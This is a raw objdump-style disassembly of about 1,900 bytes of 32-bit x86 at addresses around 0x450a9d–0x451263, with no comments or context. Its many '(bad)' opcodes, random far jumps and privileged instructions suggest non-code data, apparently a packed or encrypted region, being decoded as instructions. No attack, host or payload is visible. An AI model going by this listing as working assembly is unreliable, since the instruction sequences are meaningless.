  450a9d:	xlat   BYTE PTR ds:[ebx]
  450a9e:	ds dec ebp
  450aa0:	adc    DWORD PTR [ebx],esp
  450aa2:	jno    0x450a87
  450aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  450aa5:	jp     0x450a70
  450aa7:	aad    0x1d
  450aa9:	push   0x498bfd8a
  450aae:	sub    dl,BYTE PTR [eax]
  450ab0:	and    al,BYTE PTR [ebx+0x67964e0e]
  450ab6:	ficomp DWORD PTR [esi+edi*8+0x69ae26ed]
  450abd:	sub    DWORD PTR [ecx],0x3
  450ac0:	mov    BYTE PTR [esi],al
  450ac2:	or     BYTE PTR [ebx+0x77fc2520],dh
  450ac8:	fsub   QWORD PTR [eax]
  450aca:	sub    bl,BYTE PTR gs:[esi+edi*2]
  450ace:	dec    edi
  450acf:	bound  edi,QWORD PTR [ecx+esi*2+0x1f]
  450ad3:	outs   dx,DWORD PTR ds:[esi]
  450ad4:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  450ad6:	xchg   edi,eax
  450ad7:	inc    edi
  450ad8:	fs sbb al,0x2d
  450adb:	aam    0x94
  450add:	jp     0x450af1
  450adf:	push   esp
  450ae0:	push   ecx
  450ae1:	push   esp
  450ae2:	aas    
  450ae3:	call   0xc98c:0xdad521f4
  450aea:	je     0x450afb
  450aec:	xor    BYTE PTR [edi],0x75
  450aef:	retf   0xba08
  450af2:	jge    0x450aa9
  450af4:	dec    eax
  450af5:	out    dx,eax
  450af6:	pusha  
  450af7:	test   DWORD PTR [ecx],edx
  450af9:	mov    esi,0xe71c4918
  450afe:	and    bh,BYTE PTR [edx+0x2ccc8852]
  450b04:	dec    eax
  450b05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  450b06:	mov    ds:0x608f9c4f,al
  450b0b:	in     eax,dx
  450b0c:	jb     0x450ade
  450b0e:	(bad)  
  450b0f:	lea    edi,[edx-0x79]
  450b12:	dec    esp
  450b13:	aam    0x2a
  450b15:	xor    eax,0xd52855fe
  450b1a:	mov    al,ds:0x1f6a617b
  450b1f:	push   ebp
  450b20:	mov    cl,0x9b
  450b22:	data16 (bad) 
  450b24:	call   0x791960df
  450b29:	inc    ecx
  450b2a:	jnp    0x450b8a
  450b2c:	inc    esp
  450b2d:	out    0xf0,eax
  450b2f:	fimul  DWORD PTR [ecx-0x55a5b8b9]
  450b35:	js     0x450ae9
  450b37:	pcmpeqw mm3,QWORD PTR [esi+ebp*1]
  450b3b:	loopne 0x450b97
  450b3d:	push   es
  450b3e:	je     0x450aff
  450b40:	call   0x8981b4ef
  450b45:	inc    ebp
  450b46:	inc    ebp
  450b47:	dec    ecx
  450b48:	mov    dh,0x7f
  450b4a:	sub    al,0xa6
  450b4d:	add    dl,dl
  450b4f:	data16 in al,0xc0
  450b52:	xchg   ecx,eax
  450b54:	inc    edx
  450b55:	pop    ss
  450b56:	pop    ecx
  450b57:	popf   
  450b58:	lahf   
  450b59:	jmp    0x58f0ae4b
  450b5e:	pop    edi
  450b5f:	cwde   
  450b60:	out    dx,al
  450b61:	outs   dx,BYTE PTR ds:[esi]
  450b62:	stos   BYTE PTR es:[edi],al
  450b63:	mov    ecx,0x25205d70
  450b68:	retf   
  450b69:	adc    BYTE PTR [ecx+0x56],dl
  450b6c:	or     ebp,DWORD PTR ss:[esp+edx*4+0x1d7d2f8a]
  450b74:	mov    DWORD PTR [eax+0x52],edx
  450b77:	les    esp,FWORD PTR [ebx-0x6d]
  450b7a:	sysexit 
  450b7c:	push   es
  450b7d:	add    cl,al
  450b7f:	push   ss
  450b80:	icebp  
  450b81:	outs   dx,DWORD PTR ds:[esi]
  450b82:	push   ss
  450b83:	xchg   edi,eax
  450b84:	mov    esp,0xfd756297
  450b89:	adc    esp,DWORD PTR [edx]
  450b8b:	push   esp
  450b8c:	loopne 0x450bc5
  450b8e:	aas    
  450b8f:	sub    BYTE PTR [esi-0x39ca27ec],0xcb
  450b96:	mov    WORD PTR [ebp+0x2d],?
  450b99:	dec    ebp
  450b9a:	push   ds
  450b9b:	pop    eax
  450b9c:	xchg   BYTE PTR [edi-0x599c4904],bl
  450ba2:	jmp    0xbb79946d
  450ba7:	mov    ds,WORD PTR [eax]
  450ba9:	es pop eax
  450bab:	cmp    DWORD PTR [ebx+0x1955dae7],0xe7c49ff5
  450bb5:	call   FWORD PTR [edi]
  450bb7:	aad    0xf4
  450bb9:	inc    esp
  450bba:	add    edi,DWORD PTR [edx-0x2e272566]
  450bc0:	jmp    0x732a4b77
  450bc5:	sub    BYTE PTR [esi+0x1f4a7798],bl
  450bcb:	lahf   
  450bcc:	pushf  
  450bcd:	mov    ebp,0x66eeb87f
  450bd2:	xor    ah,dl
  450bd4:	lea    edi,[eax-0x7d78c0da]
  450bda:	cmp    al,BYTE PTR [edi+0x307cd88]
  450be0:	sbb    eax,0x6f54d711
  450be5:	add    cl,BYTE PTR [edx]
  450be7:	sub    al,BYTE PTR [ebx]
  450be9:	fistp  WORD PTR [edi+0x5e]
  450bec:	ss cwde 
  450bee:	gs ins DWORD PTR es:[edi],dx
  450bf0:	test   BYTE PTR [edx-0x10],0x17
  450bf4:	bound  eax,QWORD PTR [edx]
  450bf6:	push   edi
  450bf7:	(bad)  
  450bf8:	sbb    eax,0xd5af1fc
  450bfd:	inc    esi
  450bfe:	fwait
  450bff:	mov    esi,0xbeb55c96
  450c04:	xchg   BYTE PTR [esi+0x7b],dl
  450c07:	mov    ah,0x90
  450c09:	push   ss
  450c0a:	mov    ds:0x32cb89ca,al
  450c0f:	pop    ecx
  450c10:	adc    DWORD PTR [esi],ecx
  450c12:	xchg   DWORD PTR [ecx+ebx*2],ebp
  450c15:	add    edi,DWORD PTR [esi-0x17]
  450c18:	mov    al,ds:0xb36534a5
  450c1d:	ficomp WORD PTR [edi]
  450c1f:	retf   
  450c20:	js     0x450c4a
  450c22:	aas    
  450c23:	(bad)
  450c26:	cmp    ebp,DWORD PTR [ecx-0x16]
  450c29:	pop    ebx
  450c2a:	sbb    dl,BYTE PTR [ebx-0x2be9726c]
  450c30:	sbb    DWORD PTR ds:0x2028ddf,0x5f066a90
  450c3a:	pop    ebp
  450c3b:	mov    ds:0x8b94c263,eax
  450c40:	jo     0x450c86
  450c42:	or     esi,DWORD PTR [edx]
  450c44:	or     DWORD PTR [ebp+0x497aaaff],esi
  450c4a:	mov    al,0xbb
  450c4c:	stc    
  450c4d:	lea    esp,[ebx+edi*4+0x9]
  450c51:	sbb    edx,DWORD PTR [esp+eiz*2]
  450c54:	sub    eax,0x490d60ca
  450c59:	cmp    edi,DWORD PTR [edx]
  450c5b:	in     eax,0xb0
  450c5d:	mov    bh,0xa
  450c5f:	aam    0x75
  450c61:	sti    
  450c62:	mov    esp,0x7a6eccec
  450c67:	cmp    eax,0x350317a5
  450c6c:	xchg   edi,eax
  450c6d:	mov    ds:0x7301713,eax
  450c72:	aam    0x6f
  450c74:	cwde   
  450c75:	add    dl,BYTE PTR [edx-0x26]
  450c78:	cld    
  450c79:	fisttp WORD PTR [ebp+0x1499ce26]
  450c7f:	add    DWORD PTR [eax+0x58f9dfc9],ecx
  450c85:	xor    BYTE PTR [ebp+0x16],dh
  450c88:	arpl   WORD PTR [ebx],ax
  450c8a:	ins    BYTE PTR es:[edi],dx
  450c8b:	mov    ecx,0x229c7470
  450c90:	jge    0x450c73
  450c92:	pop    ds
  450c93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  450c94:	sbb    bh,BYTE PTR [esi+0x5e]
  450c97:	sbb    eax,0xba46b802
  450c9c:	mov    al,0x38
  450c9e:	not    BYTE PTR [edi-0x75]
  450ca1:	(bad)  [ebx+0x54fd8f86]
  450ca7:	adc    ecx,DWORD PTR [eax-0x33b7a001]
  450cad:	bound  edi,QWORD PTR ds:0x56020963
  450cb3:	inc    eax
  450cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  450cb5:	adc    dh,0x38
  450cb8:	ss in  eax,dx
  450cba:	jbe    0x450cb3
  450cbc:	rol    BYTE PTR [edi+0x6e],cl
  450cbf:	aam    0x6f
  450cc1:	(bad)  
  450cc2:	dec    eax
  450cc3:	lods   eax,DWORD PTR ds:[esi]
  450cc4:	loope  0x450ccb
  450cc6:	jmp    0x2881:0x57c221a8
  450ccd:	(bad)  [eax+0x2b]
  450cd0:	pushf  
  450cd1:	mov    al,0xae
  450cd3:	(bad)  
  450cd4:	dec    esi
  450cd5:	and    BYTE PTR [ebx+ebp*4-0xd8f65f0],0xd8
  450cdd:	ret    0xfc0c
  450ce0:	scas   al,BYTE PTR es:[edi]
  450ce1:	sub    BYTE PTR [edi],bl
  450ce3:	xor    eax,0xbb8e3e45
  450ce8:	xor    BYTE PTR [esp+eax*2],cl
  450ceb:	aam    0xe0
  450ced:	inc    ecx
  450cee:	cmp    cl,BYTE PTR [ebx+0x7d]
  450cf1:	jecxz  0x450c81
  450cf3:	adc    al,0x8a
  450cf5:	jns    0x450ceb
  450cf7:	scas   eax,DWORD PTR es:[edi]
  450cf8:	or     edx,DWORD PTR [ecx+esi*1+0x53d1c8a4]
  450cff:	call   0xfd5:0x55ef8bff
  450d06:	dec    edi
  450d07:	lea    edx,[ecx-0x5d]
  450d0a:	pop    ds
  450d0b:	shl    DWORD PTR [edx],0x20
  450d0e:	ds mov ecx,0xb5314502
  450d14:	mov    eax,ds:0x9b8a6e7
  450d19:	jmp    FWORD PTR [ebx]
  450d1b:	pop    eax
  450d1c:	push   0x4caf6d92
  450d21:	jo     0x450d5f
  450d23:	sub    al,0x29
  450d25:	pusha  
  450d26:	jg     0x450d5f
  450d28:	call   0x39fe:0x66c1d802
  450d2f:	mov    esp,0xb6086db
  450d34:	pop    ecx
  450d35:	bswap  ecx
  450d37:	mov    eax,ds:0xd57045c6
  450d3c:	inc    edx
  450d3d:	sbb    edi,ecx
  450d3f:	sbb    eax,DWORD PTR [ebp-0x5a]
  450d42:	push   0x5b
  450d44:	xchg   DWORD PTR [ecx],ecx
  450d46:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  450d48:	cmp    DWORD PTR [ebx+0x1f],ebx
  450d4b:	cmp    eax,0xd42f8c88
  450d50:	sub    BYTE PTR [edx-0x50bba443],al
  450d56:	(bad)  
  450d57:	or     al,BYTE PTR [esi+0x590b1d0b]
  450d5d:	push   edi
  450d5e:	fiadd  WORD PTR [edi-0x54726b2a]
  450d64:	mov    ecx,0x9f41f6ea
  450d69:	bound  esp,QWORD PTR [ecx-0x31]
  450d6c:	and    eax,DWORD PTR [edi+0x697cb972]
  450d72:	rcl    ebp,1
  450d74:	cwde   
  450d75:	push   eax
  450d76:	push   es
  450d77:	cs mov edx,0x32274002
  450d7d:	jmp    0xed796fdf
  450d82:	pop    ds
  450d83:	imul   eax,DWORD PTR [edi-0x34701f2],0x58d47974
  450d8d:	fwait
  450d8e:	xchg   esi,eax
  450d8f:	jnp    0x450dab
  450d91:	push   0xffffffea
  450d93:	lods   eax,DWORD PTR ds:[esi]
  450d94:	pop    ebx
  450d96:	pusha  
  450d97:	sar    BYTE PTR [ecx+0x729464ee],0x16
  450d9e:	pop    ebx
  450d9f:	sahf   
  450da0:	pop    esi
  450da1:	retf   
  450da2:	test   al,0xd5
  450da4:	push   0x49
  450da6:	call   0x9305:0x4575b6ae
  450dad:	ficomp WORD PTR [ecx+ecx*4-0x78]
  450db1:	(bad)  
  450db2:	in     eax,0x8a
  450db4:	pop    esi
  450db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  450db6:	retf   0x2fad
  450db9:	jns    0x450de6
  450dbb:	scas   eax,DWORD PTR es:[edi]
  450dbc:	clc    
  450dbd:	add    ah,BYTE PTR [ebx]
  450dbf:	mov    bl,0xfe
  450dc1:	jmp    0x20946e5
  450dc6:	idiv   al
  450dc8:	call   0xa815ccfa
  450dcd:	xchg   DWORD PTR [edx-0x52],esp
  450dd0:	retf   0xde66
  450dd3:	mov    WORD PTR [ebx+0x37],ss
  450dd6:	pop    ds
  450dd7:	adc    edi,esp
  450dd9:	jnp    0x450e04
  450ddb:	xlat   BYTE PTR ds:[ebx]
  450ddc:	add    DWORD PTR [ebx],esi
  450dde:	push   ss
  450ddf:	fs cmc 
  450de1:	pop    ebp
  450de2:	int3   
  450de3:	sar    BYTE PTR [ecx+0x4960f388],0x9f
  450dea:	jbe    0x450da7
  450dec:	nop
  450ded:	es pop esp
  450def:	fcmovne st,st(2)
  450df1:	jecxz  0x450dab
  450df3:	enter  0x7b88,0xa2
  450df7:	inc    esi
  450df8:	aam    0x4c
  450dfa:	adc    esp,0x8
  450dfd:	aaa    
  450dfe:	(bad)  
  450dff:	pop    ebx
  450e00:	test   eax,0x8fa02e33
  450e05:	call   FWORD PTR [ebp-0x6399c87]
  450e0b:	aad    0x8e
  450e0d:	xchg   ebx,eax
  450e0e:	and    al,0xd7
  450e10:	(bad)  
  450e11:	dec    esp
  450e12:	adc    ah,dh
  450e14:	cmp    esp,edx
  450e16:	pop    ecx
  450e17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  450e18:	mov    BYTE PTR [ecx],ah
  450e1a:	xchg   DWORD PTR [esi],ebp
  450e1c:	push   ds
  450e1d:	test   DWORD PTR [eax+0x205825e],eax
  450e23:	retf   0x2886
  450e26:	iret   
  450e27:	call   0x3dd5:0x765c8e5
  450e2e:	sub    edi,ebx
  450e30:	dec    edx
  450e31:	xchg   ebx,eax
  450e32:	ds or  al,0xdb
  450e35:	add    eax,0x378296fc
  450e3a:	pop    edx
  450e3b:	jno    0x450e60
  450e3d:	jne    0x450e5e
  450e3f:	and    DWORD PTR [edi+0x3001adbc],ebp
  450e45:	jecxz  0x450eb4
  450e47:	aam    0x1a
  450e49:	push   ebp
  450e4a:	icebp  
  450e4b:	test   eax,0x61313342
  450e50:	mov    BYTE PTR [ecx+0x4ad8eb36],bl
  450e56:	les    eax,FWORD PTR [edx+0x59d20302]
  450e5c:	repz iret 
  450e5e:	push   ebx
  450e5f:	loope  0x450e37
  450e61:	cmp    esi,edx
  450e63:	arpl   WORD PTR [eax+edi*8+0x4942031f],si
  450e6a:	fild   WORD PTR [ecx]
  450e6c:	xchg   ebx,eax
  450e6d:	int    0x14
  450e6f:	inc    esi
  450e70:	aad    0xf6
  450e72:	pop    ds
  450e73:	push   edi
  450e74:	shl    BYTE PTR [eax+ecx*4+0x2332ac92],cl
  450e7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  450e7c:	lds    esi,FWORD PTR [edi-0x12]
  450e7f:	or     al,0x89
  450e81:	sti    
  450e82:	xchg   ebx,eax
  450e83:	enter  0x3efe,0xb4
  450e87:	aad    0x75
  450e89:	addr16 gs jno 0x450eaa
  450e8d:	jbe    0x450e8f
  450e8f:	mov    esi,0x9ddd0b88
  450e94:	stc    
  450e95:	jg     0x450e6d
  450e97:	mov    esp,ds
  450e99:	push   cs
  450e9a:	stos   BYTE PTR es:[edi],al
  450e9b:	aam    0xb6
  450e9d:	adc    eax,ebx
  450e9f:	ficomp DWORD PTR [ecx]
  450ea1:	mov    eax,ds:0x378ba70e
  450ea6:	sub    edi,0xebcc3c4b
  450eac:	pusha  
  450ead:	cdq    
  450eae:	sbb    al,0xd7
  450eb0:	out    dx,eax
  450eb1:	push   ecx
  450eb2:	pop    esp
  450eb3:	xchg   ebp,eax
  450eb4:	mov    ds:0xf7ab309c,al
  450eb9:	add    eax,DWORD PTR [eax-0x2c]
  450ebc:	ins    DWORD PTR es:[edi],dx
  450ebd:	hlt    
  450ebe:	pop    ebx
  450ebf:	dec    edx
  450ec0:	mov    ?,WORD PTR [ebp-0x18]
  450ec3:	aad    0xcb
  450ec5:	ss sahf 
  450ec7:	cmp    ch,bl
  450ec9:	mov    ecx,0xd18e5b61
  450ece:	int    0x11
  450ed0:	push   cs
  450ed1:	repz xchg edi,eax
  450ed3:	aam    0xd1
  450ed5:	xchg   edx,eax
  450ed6:	add    eax,0x6703402
  450edb:	lahf   
  450edc:	mov    DWORD PTR [ebx+0x45],esi
  450edf:	mul    DWORD PTR [edx+0x104e3d76]
  450ee5:	add    dl,al
  450ee7:	lods   al,BYTE PTR ds:[esi]
  450ee8:	stos   BYTE PTR es:[edi],al
  450ee9:	popa   
  450eea:	sbb    edx,DWORD PTR [ebx]
  450eec:	sub    eax,0xf0af6ebe
  450ef1:	pop    ebp
  450ef2:	adc    bh,al
  450ef4:	test   eax,0x96400c7
  450ef9:	mov    bl,BYTE PTR [ebx-0x12d69d2]
  450eff:	imul   ecx,DWORD PTR [eax],0x16
  450f02:	jg     0x450f79
  450f04:	mov    edi,0xc8b5751
  450f09:	inc    eax
  450f0a:	lahf   
  450f0b:	lods   al,BYTE PTR ds:[esi]
  450f0c:	push   ebx
  450f0d:	sbb    bh,ch
  450f0f:	sbb    esi,eax
  450f11:	add    eax,0xf1c42278
  450f16:	dec    eax
  450f17:	sub    eax,0xe360c4b3
  450f1c:	xchg   edx,eax
  450f1d:	adc    eax,0x6210edb3
  450f22:	xlat   BYTE PTR ds:[ebx]
  450f23:	xlat   BYTE PTR ds:[ebx]
  450f24:	call   0x8141:0x1395282c
  450f2b:	loop   0x450f75
  450f2d:	aad    0x59
  450f2f:	stos   DWORD PTR es:[edi],eax
  450f30:	sbb    ah,BYTE PTR [ebx+edi*1]
  450f33:	cwde   
  450f34:	bound  esp,QWORD PTR [edx+0xb]
  450f37:	out    dx,eax
  450f38:	out    0xc3,eax
  450f3a:	pusha  
  450f3b:	pop    ecx
  450f3c:	sub    ebx,DWORD PTR [esi+ecx*2-0x66]
  450f40:	sar    dl,1
  450f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  450f43:	aad    0x41
  450f45:	cs sub al,0x4
  450f48:	ror    BYTE PTR [edi+0x64],1
  450f4b:	xor    ebx,DWORD PTR [ecx+edi*1+0x1f]
  450f4f:	stc    
  450f50:	(bad)  
  450f51:	hlt    
  450f52:	mov    bh,0x2c
  450f54:	sahf   
  450f55:	push   esp
  450f56:	dec    eax
  450f57:	fwait
  450f58:	aam    0x88
  450f5a:	clc    
  450f5b:	aad    0x64
  450f5d:	xor    DWORD PTR [ebx+0x67],edx
  450f60:	lds    ebx,FWORD PTR [edx]
  450f62:	pop    ds
  450f63:	or     eax,0x5e97a9d1
  450f68:	xchg   esp,eax
  450f69:	xor    al,0x7c
  450f6b:	(bad)  
  450f6c:	(bad)
  450f6f:	adc    DWORD PTR [eax],edi
  450f71:	fistp  DWORD PTR [esp+edx*4-0x4a]
  450f75:	sar    DWORD PTR [ebx],1
  450f77:	mov    DWORD PTR [eax-0x59bfb64f],ecx
  450f7d:	dec    esi
  450f7e:	leave  
  450f7f:	adc    DWORD PTR [ebx+0x3],esp
  450f82:	cld    
  450f83:	pop    ebx
  450f84:	push   esi
  450f85:	sbb    ah,BYTE PTR [ebp+0x5e8291f6]
  450f8b:	push   ebx
  450f8c:	sahf   
  450f8d:	jmp    0x7c31:0x83c5747d
  450f94:	sbb    eax,0x68aac5c2
  450f99:	lock dec ecx
  450f9b:	leave  
  450f9c:	add    ebp,DWORD PTR cs:[eax]
  450f9f:	lds    ebx,FWORD PTR [edx+ecx*2+0x67]
  450fa3:	sub    BYTE PTR [ebx],dl
  450fa5:	and    edi,DWORD PTR [ebx+0x5]
  450fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  450fa9:	xlat   BYTE PTR ds:[ebx]
  450faa:	leave  
  450fab:	aam    0xc1
  450fad:	inc    esi
  450fae:	push   0xffffff82
  450fb0:	fiadd  WORD PTR ds:0xbffc3776
  450fb6:	and    bh,bl
  450fb8:	cmp    DWORD PTR [eax+0x1e],0xf
  450fbc:	jg     0x450f8f
  450fbe:	ret    
  450fbf:	pop    edi
  450fc0:	fidivr DWORD PTR [ecx*1+0x5ea5e1aa]
  450fc7:	mov    dh,0x87
  450fc9:	in     al,0x20
  450fcb:	(bad)  
  450fcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  450fcd:	xor    ah,bl
  450fcf:	cdq    
  450fd0:	xchg   esi,eax
  450fd1:	jne    0x450f5e
  450fd3:	bound  esi,QWORD PTR [ebp+edi*4+0x1f]
  450fd7:	mov    bh,0x27
  450fd9:	aaa    
  450fda:	cld    
  450fdb:	mov    BYTE PTR [edx],cl
  450fdd:	add    esi,DWORD PTR [eax+0x27]
  450fe0:	inc    edi
  450fe1:	les    eax,FWORD PTR [edi]
  450fe3:	mov    esp,0x2160a068
  450fe8:	jp     0x451068
  450fea:	test   esi,0xf646ef49
  450ff0:	jne    0x450ff4
  450ff2:	jmp    0xacfd:0x8950c0cb
  450ff9:	loope  0x45101a
  450ffb:	leave  
  450ffc:	mov    eax,0x6ac6135
  451001:	mov    esp,0x58fad54e
  451006:	cld    
  451007:	and    DWORD PTR [ebp+0x6e],ecx
  45100a:	adc    BYTE PTR [ebx],al
  45100c:	mov    DWORD PTR [ebp-0x59],ebp
  45100f:	aas    
  451010:	icebp  
  451011:	xchg   BYTE PTR [esi-0x7d10d7d9],bl
  451017:	xlat   BYTE PTR ds:[ebx]
  451018:	mov    eax,0x91e88e2f
  45101d:	(bad)  [eax]
  45101f:	icebp  
  451020:	rol    dl,0xa8
  451023:	push   eax
  451024:	addr16 mov al,ds:0xb71f
  451028:	(bad)  
  451029:	mov    ebp,0x8604ea01
  45102e:	push   es
  45102f:	out    dx,eax
  451030:	sbb    eax,DWORD PTR [ebx]
  451032:	jle    0x45101a
  451034:	rcl    BYTE PTR [eax+0x7b675d15],0x64
  45103b:	add    esp,edi
  45103d:	sub    esp,ecx
  45103f:	cmp    DWORD PTR [ebp+edx*8+0x24521fa],edi
  451046:	mov    al,ds:0xb76c19aa
  45104b:	mov    dl,bl
  45104d:	je     0x450fde
  45104f:	mov    ebx,0x59e70261
  451054:	out    0x15,eax
  451056:	xchg   dl,bh
  451058:	aaa    
  451059:	retf   
  45105a:	mov    ebp,0xc13186af
  45105f:	mul    bh
  451061:	inc    edx
  451062:	lods   al,BYTE PTR ds:[esi]
  451063:	inc    esp
  451064:	xchg   esi,eax
  451065:	add    ebx,DWORD PTR [edi]
  451067:	ins    DWORD PTR es:[edi],dx
  451068:	gs (bad) 
  45106a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  45106b:	xor    al,0x3e
  45106d:	nop
  45106e:	add    al,0xd7
  451070:	aad    0xc
  451072:	ss jecxz 0x451082
  451075:	inc    edx
  451076:	xchg   esi,eax
  451077:	push   ds
  451078:	mov    BYTE PTR [edi],ch
  45107a:	pop    ebx
  45107b:	sub    ah,BYTE PTR [esi]
  45107d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  45107e:	push   edx
  45107f:	xor    al,0x71
  451081:	add    ecx,DWORD PTR [eax-0x7fec4bdf]
  451087:	(bad)  
  451088:	jl     0x4510d8
  45108a:	push   es
  45108b:	icebp  
  45108c:	ror    DWORD PTR [ebx+0x9],1
  45108f:	push   ds
  451090:	mov    ecx,ebp
  451092:	xchg   ecx,eax
  451093:	mov    ch,0x4
  451095:	mov    edx,0xd52ad499
  45109a:	jae    0x451038
  45109c:	or     al,0x18
  45109e:	dec    ecx
  45109f:	mov    eax,ds:0xd457e5fd
  4510a4:	rol    DWORD PTR [ebp-0x5571f8f3],cl
  4510aa:	(bad)  
  4510ab:	cdq    
  4510ac:	mov    ebx,0xc2d73cd3
  4510b1:	fwait
  4510b2:	cmp    eax,edx
  4510b4:	adc    esi,ebp
  4510b6:	pop    ds
  4510b7:	jmp    0x45105d
  4510b9:	cmp    al,0xd2
  4510bb:	jae    0x4510de
  4510bd:	fdiv   DWORD PTR [edx+0x19fb069]
  4510c3:	aam    0x6c
  4510c5:	jmp    0x75ba:0x55410fd7
  4510cc:	jae    0x45104f
  4510ce:	pop    ds
  4510cf:	add    ebx,ebp
  4510d1:	(bad)  
  4510d3:	push   edx
  4510d4:	std    
  4510d5:	add    eax,0x70d4bba4
  4510da:	call   0x49db:0x9b0a3f33
  4510e1:	mov    dh,BYTE PTR [edx]
  4510e3:	aam    0xd3
  4510e5:	jg     0x45107a
  4510e7:	stos   DWORD PTR es:[edi],eax
  4510e8:	mov    ds:0xc15ddbf7,eax
  4510ed:	mov    edi,0x4ef8111f
  4510f2:	mov    ebx,DWORD PTR [ecx+0x51f42b1]
  4510f8:	lea    esi,[edi+0x6b]
  4510fb:	mov    esi,DWORD PTR [edx]
  4510fd:	pop    edi
  4510fe:	enter  0x18d5,0x10
  451102:	sub    dl,BYTE PTR [esp+edi*8]
  451105:	and    eax,DWORD PTR [edx]
  451107:	mov    ebp,0xb90e0d89
  45110c:	(bad)
  45110f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451110:	das    
  451111:	out    0x5c,eax
  451113:	pop    edx
  451114:	lock lds esp,FWORD PTR [eax+0x36]
  451118:	mov    ebp,0xb3860365
  45111d:	push   esi
  45111e:	ins    BYTE PTR es:[edi],dx
  45111f:	sub    eax,0xbbdd3bae
  451124:	push   0x8a28e576
  451129:	add    dh,BYTE PTR [esi-0x75]
  45112c:	fisttp DWORD PTR [edi]
  45112e:	scas   eax,DWORD PTR es:[edi]
  45112f:	and    cl,BYTE PTR [ebx]
  451131:	mov    ds:0x752ffb66,al
  451136:	adc    DWORD PTR [edi-0x32fdfa49],ecx
  45113c:	ins    DWORD PTR es:[edi],dx
  45113d:	call   0x937c:0x24cbbcd1
  451144:	hlt    
  451145:	out    dx,eax
  451146:	xchg   esp,eax
  451147:	(bad)  
  451148:	lock push 0xfffffffb
  45114b:	stc    
  45114c:	pop    eax
  45114d:	lods   eax,DWORD PTR ds:[esi]
  45114e:	test   eax,0xf3976db9
  451153:	test   DWORD PTR [eax+0x2f],ecx
  451156:	mov    BYTE PTR [esi-0xae01800],dl
  45115c:	dec    ecx
  45115d:	mov    cl,dh
  45115f:	dec    edx
  451160:	(bad)  
  451161:	loopne 0x4511c5
  451163:	aam    0x72
  451165:	sbb    al,0x8c
  451167:	and    cl,dh
  451169:	sbb    eax,0xe3896570
  45116e:	div    DWORD PTR [ebx]
  451170:	in     al,dx
  451171:	mov    ch,0x46
  451173:	(bad)  [ebx-0x1193f3fe]
  451179:	dec    ecx
  45117a:	adc    al,0x75
  45117c:	push   esi
  45117d:	jnp    0x4511b6
  45117f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451180:	mov    BYTE PTR [edi-0x4e920925],ch
  451186:	addr16 push ebp
  451188:	test   eax,0xa59ef802
  45118d:	shl    BYTE PTR [ebp+0x1c],1
  451190:	sbb    ecx,edx
  451192:	adc    ah,BYTE PTR [edx-0x77]
  451195:	xchg   edi,eax
  451196:	ins    DWORD PTR es:[edi],dx
  451197:	frstor [edi+edi*1]
  45119a:	jb     0x45116f
  45119c:	xchg   ebx,eax
  45119d:	pop    ss
  45119e:	dec    esp
  45119f:	lock and bh,0x46
  4511a3:	xor    eax,0x9efe362a
  4511a8:	mov    BYTE PTR ds:0x5d43139a,cl
  4511ae:	dec    eax
  4511af:	mov    eax,ds:0x34be4403
  4511b4:	lds    edx,FWORD PTR [edi]
  4511b6:	xchg   ch,al
  4511b8:	sbb    eax,0x5e1544d4
  4511bd:	pop    ss
  4511be:	mov    DWORD PTR [esi-0x10],0xa7ab6ba1
  4511c5:	outs   dx,BYTE PTR ds:[esi]
  4511c6:	sub    al,0xf9
  4511c8:	jmp    0x8ad8cf5e
  4511cd:	add    ah,dh
  4511cf:	mov    dh,0x29
  4511d1:	sbb    DWORD PTR fs:[ecx-0x509f1afa],esi
  4511d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4511d9:	adc    bl,BYTE PTR [edi-0x71]
  4511dc:	in     al,0x5
  4511de:	lahf   
  4511df:	(bad)  
  4511e0:	and    bh,BYTE PTR [ebx+esi*2+0x7a]
  4511e4:	loopne 0x45123d
  4511e6:	cmp    DWORD PTR [edi+eax*4],edx
  4511e9:	jp     0x451242
  4511eb:	sub    DWORD PTR [edx+0x1f],esi
  4511ee:	sahf   
  4511ef:	fs dec esi
  4511f1:	push   ss
  4511f2:	mov    eax,0xf7f0d670
  4511f7:	push   ebp
  4511f8:	clc    
  4511f9:	(bad)  
  4511fa:	and    DWORD PTR [ecx+0x67f45a2],edx
  451200:	mov    BYTE PTR [ecx-0x5d8ad52c],ah
  451206:	push   edx
  451207:	mov    al,0x7e
  451209:	add    dl,BYTE PTR [esi-0x7745c2fe]
  45120f:	outs   dx,DWORD PTR ds:[esi]
  451210:	push   esi
  451211:	dec    ecx
  451212:	push   ds
  451213:	jmp    0xe87548bd
  451218:	push   ds
  451219:	pop    ss
  45121a:	xchg   ebx,eax
  45121b:	(bad)  
  45121c:	popa   
  45121d:	jmp    0x451245
  45121f:	scas   al,BYTE PTR es:[edi]
  451220:	in     al,0x21
  451222:	inc    edx
  451223:	les    edi,FWORD PTR [edi+ebx*4+0x1c28b81d]
  45122a:	and    DWORD PTR [edi],edx
  45122c:	xchg   ebx,edi
  45122e:	sub    dl,BYTE PTR [edi+0x545d7c4]
  451234:	call   0x2e5a:0x6a8a1f62
  45123b:	pop    edi
  45123c:	mov    es,WORD PTR [edx]
  45123e:	fs hlt 
  451240:	sbb    BYTE PTR [ebp-0x25],ah
  451243:	in     al,dx
  451244:	mov    bh,0x33
  451246:	or     dl,ah
  451248:	mov    bl,ch
  45124a:	adc    BYTE PTR [edi-0x73770f2e],0x1f
  451251:	repz push edi
  451253:	mov    ecx,0x1790026b
  451258:	sub    al,0x60
  45125a:	test   DWORD PTR [edi],edx
  45125c:	mov    esp,0x4d4fba3c
  451261:	jb     0x451281
  451263:	add    DWORD PTR [edi],edx
